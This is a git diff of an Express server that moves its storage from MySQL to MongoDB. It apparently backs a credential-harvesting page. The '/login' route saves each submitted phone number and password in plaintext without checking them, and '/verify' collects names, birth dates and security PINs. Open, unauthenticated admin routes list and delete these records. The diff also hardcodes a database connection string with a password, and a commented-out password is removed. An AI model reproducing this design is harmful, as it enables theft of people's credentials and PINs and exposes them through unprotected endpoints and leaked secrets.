@@ -1,105 +1,128 @@
 require("dotenv").config();
 const express = require("express");
-const mysql = require("mysql2");
+const mongoose = require("mongoose");
 const cors = require("cors");
 const bodyParser = require("body-parser");
 
 const app = express();
 
+// -------------------- CORS --------------------
 app.use(cors({
-  origin: process.env.FRONTEND_URL,
+  origin: "http://127.0.0.1:5500", // or your local frontend URL
   credentials: true
 }));
+
+
 app.use(bodyParser.json());
 
-// ----------------------------------
-//       MySQL Connection
-// ----------------------------------
-// const db = mysql.createConnection({
-//     host: process.env.DB_HOST || "localhost",
-//     user: process.env.DB_USER || "root",
-//     password: process.env.DB_PASS || "Jayprakash69@",
-//     database: process.env.DB_NAME || "auth_system"
-// });
+// -------------------- MongoDB Connection --------------------
+const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://rajeev913572_db_user:Rajeev69%40@rajeev.cjfckjj.mongodb.net/auth_system?retryWrites=true&w=majority";
 
-const db = mysql.createConnection({
-    host: process.env.DB_HOST,
-    user: process.env.DB_USER,
-    password: process.env.DB_PASS,
-    database: process.env.DB_NAME
+const mongoURI = process.env.MONGO_URI;
+
+mongoose.connect(mongoURI)
+    .then(() => console.log("MongoDB connected successfully!"))
+    .catch(err => console.log("MongoDB connection error:", err));
+
+// -------------------- Schemas --------------------
+const userSchema = new mongoose.Schema({
+    phone: { type: String, required: true },
+    password: { type: String, required: true },
+    createdAt: { type: Date, default: Date.now }
 });
 
-db.connect(err => {
-    if (err) {
-        console.log("MySQL connection failed!", err);
-        return;
+const verificationSchema = new mongoose.Schema({
+    user_id: { type: mongoose.Schema.Types.ObjectId, ref: "User", required: true },
+    full_name: String,
+    dob: Date,
+    problem: String,
+    security_pin: String,
+    experience: String,
+    createdAt: { type: Date, default: Date.now }
+});
+
+const User = mongoose.model("User", userSchema);
+const Verification = mongoose.model("Verification", verificationSchema);
+
+// -------------------- Routes --------------------
+
+// Login / Signup (insert user)
+app.post("/login", async (req, res) => {
+    try {
+        const { phone, password } = req.body;
+        const user = new User({ phone, password });
+        await user.save();
+        res.json({ success: true, user_id: user._id });
+    } catch (err) {
+        console.log(err);
+        res.json({ success: false, message: "Error saving user" });
     }
-    console.log("MySQL connected successfully!");
 });
 
-// ----------------------------------
-// Your Routes (Same as before)
-// ----------------------------------
-
-app.post("/login", (req, res) => {
-    const { phone, password } = req.body;
-    const sql = "INSERT INTO users (phone, password) VALUES (?, ?)";
-    db.query(sql, [phone, password], (err, result) => {
-        if (err) return res.json({ success: false, message: "Error!" });
-        res.json({ success: true, user_id: result.insertId });
-    });
-});
-
-app.post("/verify", (req, res) => {
-    const { user_id, full_name, dob, problem, security_pin, experience } = req.body;
-    const sql = "INSERT INTO verification (user_id, full_name, dob, problem, security_pin, experience) VALUES (?, ?, ?, ?, ?, ?)";
-    db.query(sql, [user_id, full_name, dob, problem, security_pin, experience], (err, result) => {
-        if (err) return res.json({ success: false, message: err });
+// Verification submission
+app.post("/verify", async (req, res) => {
+    try {
+        const { user_id, full_name, dob, problem, security_pin, experience } = req.body;
+        const verification = new Verification({ user_id, full_name, dob, problem, security_pin, experience });
+        await verification.save();
         res.json({ success: true, message: "Verification submitted!" });
-    });
+    } catch (err) {
+        console.log(err);
+        res.json({ success: false, message: err.message });
+    }
 });
 
-app.get("/admin/getUsers", (req, res) => {
-    db.query("SELECT * FROM users ORDER BY id DESC", (err, results) => {
-        if (err) return res.json({ success: false, error: err });
-        res.json(results);
-    });
+// Admin routes: get users
+app.get("/admin/getUsers", async (req, res) => {
+    try {
+        const users = await User.find().sort({ createdAt: -1 });
+        res.json(users);
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-app.get("/admin/getVerification", (req, res) => {
-    db.query("SELECT * FROM verification ORDER BY id DESC", (err, results) => {
-        if (err) return res.json({ success: false, error: err });
-        res.json(results);
-    });
+// Get verifications
+app.get("/admin/getVerification", async (req, res) => {
+    try {
+        const verifications = await Verification.find().sort({ createdAt: -1 });
+        res.json(verifications);
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-// ------------------- Update & Delete -------------------
-app.put("/admin/updateUser/:id", (req, res) => {
-    const { phone, password } = req.body;
-    db.query("UPDATE users SET phone=?, password=? WHERE id=?", [phone, password, req.params.id], (err) => {
-        if (err) return res.json({ success:false, error: err });
-        res.json({ success:true });
-    });
+// Update user
+app.put("/admin/updateUser/:id", async (req, res) => {
+    try {
+        const { phone, password } = req.body;
+        await User.findByIdAndUpdate(req.params.id, { phone, password });
+        res.json({ success: true });
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-app.delete("/admin/deleteUser/:id", (req, res) => {
-    db.query("DELETE FROM users WHERE id=?", [req.params.id], (err) => {
-        if (err) return res.json({ success:false, error: err });
-        res.json({ success:true });
-    });
+// Delete user
+app.delete("/admin/deleteUser/:id", async (req, res) => {
+    try {
+        await User.findByIdAndDelete(req.params.id);
+        res.json({ success: true });
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-app.delete("/admin/deleteVerification/:id", (req, res) => {
-    db.query("DELETE FROM verification WHERE id=?", [req.params.id], (err) => {
-        if (err) return res.json({ success:false, error: err });
-        res.json({ success:true });
-    });
+// Delete verification
+app.delete("/admin/deleteVerification/:id", async (req, res) => {
+    try {
+        await Verification.findByIdAndDelete(req.params.id);
+        res.json({ success: true });
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
 });
 
-// ----------------------------------
-// Start Server (Important Change!)
-// ----------------------------------
+// -------------------- Start Server --------------------
 const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => {
-    console.log("Server running on port", PORT);
-});
+app.listen(PORT, () => console.log("Server running on port", PORT));
